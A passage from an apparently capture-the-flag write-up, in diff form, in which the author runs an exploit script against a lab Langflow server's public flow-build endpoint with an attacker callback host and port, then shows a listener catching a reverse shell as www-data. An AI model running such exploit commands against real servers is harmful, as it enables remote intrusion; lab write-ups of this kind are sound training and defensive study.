@@ -190,4 +190,33 @@ penelope -p 1337
 
 Ill start a listener
 
-On the first attempt, this attack fails, and reviewing the code i see it
+On the first attempt, this attack fails, and reviewing the code i see its not handling HTTPS
+
+![](Pasted%20image%2020260822181512.png)
+
+To fix this ill add a simple line to the `send_payload()` function
+
+```python
+python3 exploit.py --url https://flow.fireflow.htb/ --flow-id '7d84d636-af65-42e4-ac38-26e867052c25' --lhost 10.10.14.61 --lport 1337
+[*] Target: https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct&log_builds=false
+[*] Callback: 10.10.14.61:1337
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1110: InsecureRequestWarning: Unverified HTTPS request is being made to host 'flow.fireflow.htb'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
+  warnings.warn(
+```
+
+```python
+penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => fireflow 10.129.48.171 Linux-x86_64 👤 www-data(33) 😍️ Session ID <1>
+[+] Upgrading shell to PTY...
+[+] PTY upgrade successful via /usr/bin/python3
+[+] Interacting with session [1] • PTY • Menu key F12 ⇐
+[+] Session log: /home/kali/.penelope/sessions/fireflow~10.129.48.171-Linux-x86_64/2026_08_22-18_15_44-799.log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+www-data@fireflow:/var/lib/langflow$ whoami
+www-data
+www-data@fireflow:/var/lib/langflow$
+```
+
+I now have 
